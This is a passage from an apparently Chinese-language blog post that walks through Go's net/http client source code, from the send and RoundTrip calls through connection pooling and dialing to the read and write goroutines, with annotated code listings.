class="line">&#125;</span><br><span class="line">return resp, nil, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又再次调用了send函数，继续：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">func send(ireq *Request, rt RoundTripper, deadline time.Time) (resp *Response, didTimeout func() bool, err error) &#123;</span><br><span class="line">req :&#x3D; ireq &#x2F;&#x2F; req is either the original request, or a modified fork</span><br><span class="line"></span><br><span class="line">if rt &#x3D;&#x3D; nil &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, alwaysFalse, errors.New(&quot;http: no Client.Transport or DefaultTransport&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;省略</span><br><span class="line">        &#x2F;&#x2F;重点</span><br><span class="line">stopTimer, didTimeout :&#x3D; setRequestCancel(req, rt, deadline)</span><br><span class="line">&#x2F;&#x2F;调用了rt的RoundTrip方法</span><br><span class="line">resp, err &#x3D; rt.RoundTrip(req)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">stopTimer()</span><br><span class="line">if resp !&#x3D; nil &#123;</span><br><span class="line">log.Printf(&quot;RoundTripper returned a response &amp; error; ignoring response&quot;)</span><br><span class="line">&#125;</span><br><span class="line">if tlsErr, ok :&#x3D; err.(tls.RecordHeaderError); ok &#123;</span><br><span class="line">&#x2F;&#x2F; If we get a bad TLS record header, check to see if the</span><br><span class="line">&#x2F;&#x2F; response looks like HTTP and give a more helpful error.</span><br><span class="line">&#x2F;&#x2F; See golang.org&#x2F;issue&#x2F;11111.</span><br><span class="line">if string(tlsErr.RecordHeader[:]) &#x3D;&#x3D; &quot;HTTP&#x2F;&quot; &#123;</span><br><span class="line">err &#x3D; errors.New(&quot;http: server gave HTTP response to HTTPS client&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return nil, didTimeout, err</span><br></pre></td></tr></table></figure><p>可以看到，send函数实际上调用了RoundTripper这个interface的RoundTrip方法，也就是上面c.transport()类型所实现的RoundTrip方法，那么c.transport()返回值是什么类型呢？来看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">func (c *Client) transport() RoundTripper &#123;</span><br><span class="line">if c.Transport !&#x3D; nil &#123;</span><br><span class="line">return c.Transport</span><br><span class="line">&#125;</span><br><span class="line">return DefaultTransport</span><br><span class="line">&#125;</span><br><span class="line">var DefaultTransport RoundTripper &#x3D; &amp;Transport&#123;</span><br><span class="line">Proxy: ProxyFromEnvironment,</span><br><span class="line">DialContext: (&amp;net.Dialer&#123;</span><br><span class="line">Timeout:   30 * time.Second,</span><br><span class="line">KeepAlive: 30 * time.Second,</span><br><span class="line">DualStack: true,</span><br><span class="line">&#125;).DialContext,</span><br><span class="line">ForceAttemptHTTP2:     true,</span><br><span class="line">MaxIdleConns:          100,</span><br><span class="line">IdleConnTimeout:       90 * time.Second,</span><br><span class="line">TLSHandshakeTimeout:   10 * time.Second,</span><br><span class="line">ExpectContinueTimeout: 1 * time.Second,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现是Transport类型，那来看看Transport类型是如何实现RoundTrip方法的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; roundTrip implements a RoundTripper over HTTP.</span><br><span class="line">func (t *Transport) roundTrip(req *Request) (*Response, error) &#123;</span><br><span class="line">t.nextProtoOnce.Do(t.onceSetNextProtoDefaults)</span><br><span class="line">ctx :&#x3D; req.Context()</span><br><span class="line">trace :&#x3D; httptrace.ContextClientTrace(ctx)</span><br><span class="line"></span><br><span class="line">if req.URL &#x3D;&#x3D; nil &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, errors.New(&quot;http: nil Request.URL&quot;)</span><br><span class="line">&#125;</span><br><span class="line">if req.Header &#x3D;&#x3D; nil &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, errors.New(&quot;http: nil Request.Header&quot;)</span><br><span class="line">&#125;</span><br><span class="line">scheme :&#x3D; req.URL.Scheme</span><br><span class="line">isHTTP :&#x3D; scheme &#x3D;&#x3D; &quot;http&quot; || scheme &#x3D;&#x3D; &quot;https&quot;</span><br><span class="line">if isHTTP &#123;</span><br><span class="line">for k, vv :&#x3D; range req.Header &#123;</span><br><span class="line">if !httpguts.ValidHeaderFieldName(k) &#123;</span><br><span class="line">return nil, fmt.Errorf(&quot;net&#x2F;http: invalid header field name %q&quot;, k)</span><br><span class="line">&#125;</span><br><span class="line">for _, v :&#x3D; range vv &#123;</span><br><span class="line">if !httpguts.ValidHeaderFieldValue(v) &#123;</span><br><span class="line">return nil, fmt.Errorf(&quot;net&#x2F;http: invalid header field value %q for key %v&quot;, v, k)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if t.useRegisteredProtocol(req) &#123;</span><br><span class="line">altProto, _ :&#x3D; t.altProto.Load().(map[string]RoundTripper)</span><br><span class="line">if altRT :&#x3D; altProto[scheme]; altRT !&#x3D; nil &#123;</span><br><span class="line">if resp, err :&#x3D; altRT.RoundTrip(req); err !&#x3D; ErrSkipAltProtocol &#123;</span><br><span class="line">return resp, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if !isHTTP &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, &amp;badStringError&#123;&quot;unsupported protocol scheme&quot;, scheme&#125;</span><br><span class="line">&#125;</span><br><span class="line">if req.Method !&#x3D; &quot;&quot; &amp;&amp; !validMethod(req.Method) &#123;</span><br><span class="line">return nil, fmt.Errorf(&quot;net&#x2F;http: invalid method %q&quot;, req.Method)</span><br><span class="line">&#125;</span><br><span class="line">if req.URL.Host &#x3D;&#x3D; &quot;&quot; &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, errors.New(&quot;http: no Host in request URL&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for &#123;</span><br><span class="line">select &#123;</span><br><span class="line">case &lt;-ctx.Done():</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, ctx.Err()</span><br><span class="line">default:</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; treq gets modified by roundTrip, so we need to recreate for each retry.</span><br><span class="line">treq :&#x3D; &amp;transportRequest&#123;Request: req, trace: trace&#125;</span><br><span class="line">cm, err :&#x3D; t.connectMethodForRequest(treq)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Get the cached or newly-created connection to either the</span><br><span class="line">&#x2F;&#x2F; host (for http or https), the http proxy, or the http proxy</span><br><span class="line">&#x2F;&#x2F; pre-CONNECTed to https server. In any case, we&#39;ll be ready</span><br><span class="line">&#x2F;&#x2F; to send it requests.</span><br><span class="line">&#x2F;&#x2F;重点是这个函数getConn</span><br><span class="line">pconn, err :&#x3D; t.getConn(treq, cm)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">t.setReqCanceler(req, nil)</span><br><span class="line">req.closeBody()</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var resp *Response</span><br><span class="line">if pconn.alt !&#x3D; nil &#123;</span><br><span class="line">&#x2F;&#x2F; HTTP&#x2F;2 path.</span><br><span class="line">t.setReqCanceler(req, nil) &#x2F;&#x2F; not cancelable with CancelRequest</span><br><span class="line">resp, err &#x3D; pconn.alt.RoundTrip(req)</span><br><span class="line">&#125; else &#123;</span><br><span class="line">resp, err &#x3D; pconn.roundTrip(treq)</span><br><span class="line">&#125;</span><br><span class="line">if err &#x3D;&#x3D; nil &#123;</span><br><span class="line">return resp, nil</span><br><span class="line">&#125;</span><br><span class="line">if http2isNoCachedConnError(err) &#123;</span><br><span class="line">t.removeIdleConn(pconn)</span><br><span class="line">&#125; else if !pconn.shouldRetryRequest(req, err) &#123;</span><br><span class="line">&#x2F;&#x2F; Issue 16465: return underlying net.Conn.Read error from peek,</span><br><span class="line">&#x2F;&#x2F; as we&#39;ve historically done.</span><br><span class="line">if e, ok :&#x3D; err.(transportReadFromServerError); ok &#123;</span><br><span class="line">err &#x3D; e.err</span><br><span class="line">&#125;</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line">testHookRoundTripRetried()</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Rewind the body if we&#39;re able to.</span><br><span class="line">if req.GetBody !&#x3D; nil &#123;</span><br><span class="line">newReq :&#x3D; *req</span><br><span class="line">var err error</span><br><span class="line">newReq.Body, err &#x3D; req.GetBody()</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line">req &#x3D; &amp;newReq</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到主要是调用了getConn方法返回一个*persistConn类型的变量，继续跟进看看getConn是如何实现的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) getConn(treq *transportRequest, cm connectMethod) (pc *persistConn, err error) &#123;</span><br><span class="line">req :&#x3D; treq.Request</span><br><span class="line">trace :&#x3D; treq.trace</span><br><span class="line">ctx :&#x3D; req.Context()</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.GetConn !&#x3D; nil &#123;</span><br><span class="line">trace.GetConn(cm.addr())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">w :&#x3D; &amp;wantConn&#123;</span><br><span class="line">cm:         cm,</span><br><span class="line">key:        cm.key(),</span><br><span class="line">ctx:        ctx,</span><br><span class="line">ready:      make(chan struct&#123;&#125;, 1),</span><br><span class="line">beforeDial: testHookPrePendingDial,</span><br><span class="line">afterDial:  testHookPostPendingDial,</span><br><span class="line">&#125;</span><br><span class="line">defer func() &#123;</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">w.cancel(t, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&#x2F;&#x2F;尝试去空闲的连接池中寻找</span><br><span class="line">&#x2F;&#x2F;client针对每个host最多可以分别复用两个连接</span><br><span class="line">&#x2F;&#x2F; Queue for idle connection.</span><br><span class="line">if delivered :&#x3D; t.queueForIdleConn(w); delivered &#123;</span><br><span class="line">pc :&#x3D; w.pc</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.GotConn !&#x3D; nil &#123;</span><br><span class="line">trace.GotConn(pc.gotIdleConnTrace(pc.idleAt))</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F; set request canceler to some non-nil function so we</span><br><span class="line">&#x2F;&#x2F; can detect whether it was cleared between now and when</span><br><span class="line">&#x2F;&#x2F; we enter roundTrip</span><br><span class="line">t.setReqCanceler(req, func(error) &#123;&#125;)</span><br><span class="line">return pc, nil</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cancelc :&#x3D; make(chan error, 1)</span><br><span class="line">t.setReqCanceler(req, func(err error) &#123; cancelc &lt;- err &#125;)</span><br><span class="line">&#x2F;&#x2F;当没有在连接池中找到可用连接时，新建一个</span><br><span class="line">&#x2F;&#x2F; Queue for permission to dial.</span><br><span class="line">t.queueForDial(w)</span><br><span class="line">       &#x2F;&#x2F; Wait for completion or cancellation.</span><br><span class="line">select &#123;</span><br><span class="line">case &lt;-w.ready:</span><br><span class="line">&#x2F;&#x2F; Trace success but only for HTTP&#x2F;1.</span><br><span class="line">&#x2F;&#x2F; HTTP&#x2F;2 calls trace.GotConn itself.</span><br><span class="line">if w.pc !&#x3D; nil &amp;&amp; w.pc.alt &#x3D;&#x3D; nil &amp;&amp; trace !&#x3D; nil &amp;&amp; trace.GotConn !&#x3D; nil &#123;</span><br><span class="line">trace.GotConn(httptrace.GotConnInfo&#123;Conn: w.pc.conn, Reused: w.pc.isReused()&#125;)</span><br><span class="line">&#125;</span><br><span class="line">if w.err !&#x3D; nil &#123;</span><br><span class="line">&#x2F;&#x2F; If the request has been cancelled, that&#39;s probably</span><br><span class="line">&#x2F;&#x2F; what caused w.err; if so, prefer to return the</span><br><span class="line">&#x2F;&#x2F; cancellation error (see golang.org&#x2F;issue&#x2F;16049).</span><br><span class="line">select &#123;</span><br><span class="line">case &lt;-req.Cancel:</span><br><span class="line">return nil, errRequestCanceledConn</span><br><span class="line">case &lt;-req.Context().Done():</span><br><span class="line">return nil, req.Context().Err()</span><br><span class="line">case err :&#x3D; &lt;-cancelc:</span><br><span class="line">if err &#x3D;&#x3D; errRequestCanceled &#123;</span><br><span class="line">err &#x3D; errRequestCanceledConn</span><br><span class="line">&#125;</span><br><span class="line">return nil, err</span><br><span class="line">default:</span><br><span class="line">&#x2F;&#x2F; return below</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return w.pc, w.err</span><br><span class="line">case &lt;-req.Cancel:</span><br><span class="line">return nil, errRequestCanceledConn</span><br><span class="line">case &lt;-req.Context().Done():</span><br><span class="line">return nil, req.Context().Err()</span><br><span class="line">case err :&#x3D; &lt;-cancelc:</span><br><span class="line">if err &#x3D;&#x3D; errRequestCanceled &#123;</span><br><span class="line">err &#x3D; errRequestCanceledConn</span><br><span class="line">&#125;</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们新建连接时，若没有在Client结构体所维护的连接池中找到可用的连接，那么就调用queueForDial方法，这里需要注意，当Transport没有设置MaxIdleConnsPerHost这个值的情况下，client针对每个不同的host所能维持的connection默认值为2。</p><p>接下来看看queueForDial方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) queueForDial(w *wantConn) &#123;</span><br><span class="line">w.beforeDial()</span><br><span class="line">if t.MaxConnsPerHost &lt;&#x3D; 0 &#123;</span><br><span class="line">go t.dialConnFor(w)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">t.connsPerHostMu.Lock()</span><br><span class="line">defer t.connsPerHostMu.Unlock()</span><br><span class="line"></span><br><span class="line">if n :&#x3D; t.connsPerHost[w.key]; n &lt; t.MaxConnsPerHost &#123;</span><br><span class="line">if t.connsPerHost &#x3D;&#x3D; nil &#123;</span><br><span class="line">t.connsPerHost &#x3D; make(map[connectMethodKey]int)</span><br><span class="line">&#125;</span><br><span class="line">t.connsPerHost[w.key] &#x3D; n + 1</span><br><span class="line">go t.dialConnFor(w)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if t.connsPerHostWait &#x3D;&#x3D; nil &#123;</span><br><span class="line">t.connsPerHostWait &#x3D; make(map[connectMethodKey]wantConnQueue)</span><br><span class="line">&#125;</span><br><span class="line">q :&#x3D; t.connsPerHostWait[w.key]</span><br><span class="line">q.cleanFront()</span><br><span class="line">q.pushBack(w)</span><br><span class="line">t.connsPerHostWait[w.key] &#x3D; q</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进dialConnFor方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) dialConnFor(w *wantConn) &#123;</span><br><span class="line">defer w.afterDial()</span><br><span class="line"></span><br><span class="line">pc, err :&#x3D; t.dialConn(w.ctx, w.cm)</span><br><span class="line">delivered :&#x3D; w.tryDeliver(pc, err)</span><br><span class="line">if err &#x3D;&#x3D; nil &amp;&amp; (!delivered || pc.alt !&#x3D; nil) &#123;</span><br><span class="line">&#x2F;&#x2F; pconn was not passed to w,</span><br><span class="line">&#x2F;&#x2F; or it is HTTP&#x2F;2 and can be shared.</span><br><span class="line">&#x2F;&#x2F; Add to the idle connection pool.</span><br><span class="line">t.putOrCloseIdleConn(pc)</span><br><span class="line">&#125;</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">t.decConnsPerHost(w.key)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟dialConn方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">func (t *Transport) dialConn(ctx context.Context, cm connectMethod) (pconn *persistConn, err error) &#123;</span><br><span class="line">&#x2F;&#x2F; 生成一个*persistConn对象</span><br><span class="line">pconn &#x3D; &amp;persistConn&#123;</span><br><span class="line">t:             t,</span><br><span class="line">cacheKey:      cm.key(),</span><br><span class="line">reqch:         make(chan requestAndChan, 1),</span><br><span class="line">writech:       make(chan writeRequest, 1),</span><br><span class="line">closech:       make(chan struct&#123;&#125;),</span><br><span class="line">writeErrCh:    make(chan error, 1),</span><br><span class="line">writeLoopDone: make(chan struct&#123;&#125;),</span><br><span class="line">&#125;</span><br><span class="line">trace :&#x3D; httptrace.ContextClientTrace(ctx)</span><br><span class="line">wrapErr :&#x3D; func(err error) error &#123;</span><br><span class="line">if cm.proxyURL !&#x3D; nil &#123;</span><br><span class="line">&#x2F;&#x2F; Return a typed error, per Issue 16997</span><br><span class="line">return &amp;net.OpError&#123;Op: &quot;proxyconnect&quot;, Net: &quot;tcp&quot;, Err: err&#125;</span><br><span class="line">&#125;</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;下面是连接代码</span><br><span class="line">if cm.scheme() &#x3D;&#x3D; &quot;https&quot; &amp;&amp; t.DialTLS !&#x3D; nil &#123;</span><br><span class="line">var err error</span><br><span class="line">pconn.conn, err &#x3D; t.DialTLS(&quot;tcp&quot;, cm.addr())</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, wrapErr(err)</span><br><span class="line">&#125;</span><br><span class="line">if pconn.conn &#x3D;&#x3D; nil &#123;</span><br><span class="line">return nil, wrapErr(errors.New(&quot;net&#x2F;http: Transport.DialTLS returned (nil, nil)&quot;))</span><br><span class="line">&#125;</span><br><span class="line">if tc, ok :&#x3D; pconn.conn.(*tls.Conn); ok &#123;</span><br><span class="line">&#x2F;&#x2F; Handshake here, in case DialTLS didn&#39;t. TLSNextProto below</span><br><span class="line">&#x2F;&#x2F; depends on it for knowing the connection state.</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.TLSHandshakeStart !&#x3D; nil &#123;</span><br><span class="line">trace.TLSHandshakeStart()</span><br><span class="line">&#125;</span><br><span class="line">if err :&#x3D; tc.Handshake(); err !&#x3D; nil &#123;</span><br><span class="line">go pconn.conn.Close()</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.TLSHandshakeDone !&#x3D; nil &#123;</span><br><span class="line">trace.TLSHandshakeDone(tls.ConnectionState&#123;&#125;, err)</span><br><span class="line">&#125;</span><br><span class="line">return nil, err</span><br><span class="line">&#125;</span><br><span class="line">cs :&#x3D; tc.ConnectionState()</span><br><span class="line">if trace !&#x3D; nil &amp;&amp; trace.TLSHandshakeDone !&#x3D; nil &#123;</span><br><span class="line">trace.TLSHandshakeDone(cs, nil)</span><br><span class="line">&#125;</span><br><span class="line">pconn.tlsState &#x3D; &amp;cs</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">conn, err :&#x3D; t.dial(ctx, &quot;tcp&quot;, cm.addr())</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, wrapErr(err)</span><br><span class="line">&#125;</span><br><span class="line">pconn.conn &#x3D; conn</span><br><span class="line">if cm.scheme() &#x3D;&#x3D; &quot;https&quot; &#123;</span><br><span class="line">var firstTLSHost string</span><br><span class="line">if firstTLSHost, _, err &#x3D; net.SplitHostPort(cm.addr()); err !&#x3D; nil &#123;</span><br><span class="line">return nil, wrapErr(err)</span><br><span class="line">&#125;</span><br><span class="line">if err &#x3D; pconn.addTLS(firstTLSHost, trace); err !&#x3D; nil &#123;</span><br><span class="line">return nil, wrapErr(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;省略一部分不重要的代码</span><br><span class="line">        &#x2F;&#x2F;重点来了</span><br><span class="line">pconn.br &#x3D; bufio.NewReaderSize(pconn, t.readBufferSize())</span><br><span class="line">pconn.bw &#x3D; bufio.NewWriterSize(persistConnWriter&#123;pconn&#125;, t.writeBufferSize())</span><br><span class="line">&#x2F;&#x2F;起了俩goroutine，一个负责在conn上读，一个负责写</span><br><span class="line">go pconn.readLoop()</span><br><span class="line">go pconn.writeLoop()</span><br><span class="line">return pconn, nil</span><br></pre></td></tr></table></figure><p>兜兜绕绕终于来到了关键的地方，在connection成功建立之后，可以看见启动了两个goroutine来负责读写<br>我们挑readloop来看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span 